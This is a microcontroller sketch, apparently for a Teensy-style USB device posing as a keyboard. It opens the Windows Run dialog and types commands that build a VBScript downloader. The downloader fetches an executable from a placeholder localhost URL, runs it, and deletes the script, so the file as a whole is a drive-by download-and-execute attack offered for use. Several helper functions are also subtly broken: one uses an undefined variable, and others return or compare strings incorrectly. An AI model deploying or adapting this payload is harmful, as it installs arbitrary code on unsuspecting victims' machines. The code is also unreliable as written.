
int myKeyBreak = 50;

void setup() {
  delay(10000);
  omg("cmd.exe");
  delay(500);
  ascii_println("del x.exe");
  delay(myKeyBreak);
  ascii_println("echo strFileURL = \"http://127.0.0.1/x.exe\" > omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo strHDLocation = \"x.exe\" >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objXMLHTTP.open \"GET\", strFileURL, false >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objXMLHTTP.send() >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo If objXMLHTTP.Status = 200 Then >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Open >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Type = 1 >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Write objXMLHTTP.ResponseBody >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Position = 0 >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objFSO = Nothing >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.SaveToFile strHDLocation >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Close >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objADOStream = Nothing >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo End if >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objXMLHTTP = Nothing >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("exit");
  delay(1000);
  omg("cmd /c cscript omg.vbs");
  delay(8000);
  omg("cmd /c del omg.vbs");
  delay(1000);
  omg("cmd /c x.exe");
  delay(1000000);
}

/*
void loop() {
}

*/

void ascii_println(char *string){
  ascii_type_this(string);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}


void ascii_type_this(char *string){
  int count, length;
  unsigned char tmp = '\0';
  length = strlen(string);
  for(count = 0 ; count < length ; count++){
    tmp = string[count];
    ascii_input(ascii_convert(a));
  }
}

void ascii_input(char *string){
  if (string == "000") return;
  int count, length;
  length = strlen(string);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  for(count = 0 ; count < length ; count++)
  {
    char a = string[count];
    if (a == '1') Keyboard.set_key1(KEYPAD_1);
    if (a == '2') Keyboard.set_key1(KEYPAD_2);
    if (a == '3') Keyboard.set_key1(KEYPAD_3);
    if (a == '4') Keyboard.set_key1(KEYPAD_4);
    if (a == '5') Keyboard.set_key1(KEYPAD_5);
    if (a == '6') Keyboard.set_key1(KEYPAD_6);
    if (a == '7') Keyboard.set_key1(KEYPAD_7);
    if (a == '8') Keyboard.set_key1(KEYPAD_8);
    if (a == '9') Keyboard.set_key1(KEYPAD_9);
    if (a == '0') Keyboard.set_key1(KEYPAD_0);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    delay(11);
    Keyboard.send_now();
  }
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

char* ascii_convert(char strChar){
  return (int)strChar;
  /*
  if (strChar == 'T') return "84";
  if (strChar == ' ') return "32";
  if (strChar == '!') return "33";
  if (strChar == '\"') return "34";
  if (strChar == '#') return "35";
  if (strChar == '$') return "36";
  if (strChar == '%') return "37";
  if (strChar == '&') return "38";
  if (strChar == '\'') return "39";
  if (strChar == '(') return "40";
  if (strChar == ')') return "41";
  if (strChar == '*') return "42";
  if (strChar == '+') return "43";
  if (strChar == ',') return "44";
  if (strChar == '-') return "45";
  if (strChar == '.') return "46";
  if (strChar == '/') return "47";
  if (strChar == '0') return "48";
  if (strChar == '1') return "49";
  if (strChar == '2') return "50";
  if (strChar == '3') return "51";
  if (strChar == '4') return "52";
  if (strChar == '5') return "53";
  if (strChar == '6') return "54";
  if (strChar == '7') return "55";
  if (strChar == '8') return "56";
  if (strChar == '9') return "57";
  if (strChar == ':') return "58";
  if (strChar == ';') return "59";
  if (strChar == '<') return "60";
  if (strChar == '=') return "61";
  if (strChar == '>') return "62";
  if (strChar == '?') return "63";
  if (strChar == '@') return "64";
  if (strChar == 'A') return "65";
  if (strChar == 'B') return "66";
  if (strChar == 'C') return "67";
  if (strChar == 'D') return "68";
  if (strChar == 'E') return "69";
  if (strChar == 'F') return "70";
  if (strChar == 'G') return "71";
  if (strChar == 'H') return "72";
  if (strChar == 'I') return "73";
  if (strChar == 'J') return "74";
  if (strChar == 'K') return "75";
  if (strChar == 'L') return "76";
  if (strChar == 'M') return "77";
  if (strChar == 'N') return "78";
  if (strChar == 'O') return "79";
  if (strChar == 'P') return "80";
  if (strChar == 'Q') return "81";
  if (strChar == 'R') return "82";
  if (strChar == 'S') return "83";
  if (strChar == 'T') return "84";
  if (strChar == 'U') return "85";
  if (strChar == 'V') return "86";
  if (strChar == 'W') return "87";
  if (strChar == 'X') return "88";
  if (strChar == 'Y') return "89";
  if (strChar == 'Z') return "90";
  if (strChar == '[') return "91";
  if (strChar == '\\') return "92";
  if (strChar == ']') return "93";
  if (strChar == '^') return "94";
  if (strChar == '_') return "95";
  if (strChar == '`') return "96";
  if (strChar == 'a') return "97";
  if (strChar == 'b') return "98";
  if (strChar == 'c') return "99";
  if (strChar == 'd') return "100";
  if (strChar == 'e') return "101";
  if (strChar == 'f') return "102";
  if (strChar == 'g') return "103";
  if (strChar == 'h') return "104";
  if (strChar == 'i') return "105";
  if (strChar == 'j') return "106";
  if (strChar == 'k') return "107";
  if (strChar == 'l') return "108";
  if (strChar == 'm') return "109";
  if (strChar == 'n') return "110";
  if (strChar == 'o') return "111";
  if (strChar == 'p') return "112";
  if (strChar == 'q') return "113";
  if (strChar == 'r') return "114";
  if (strChar == 's') return "115";
  if (strChar == 't') return "116";
  if (strChar == 'u') return "117";
  if (strChar == 'v') return "118";
  if (strChar == 'w') return "119";
  if (strChar == 'x') return "120";
  if (strChar == 'y') return "121";
  if (strChar == 'z') return "122";
  if (strChar == '{') return "123";
  if (strChar == '|') return "124";
  if (strChar == '}') return "125";
  if (strChar == '~') return "126";
  Keyboard.print(string);
  return "000";
  */
}

void release_keys(){
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}

void send_keys(byte key, byte modifier){
  if(modifier)
    Keyboard.set_modifier(modifier);
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(100);
  release_keys();   
}

void omg(char *SomeCommand){
  Keyboard.set_modifier(128); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  ascii_type_this(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
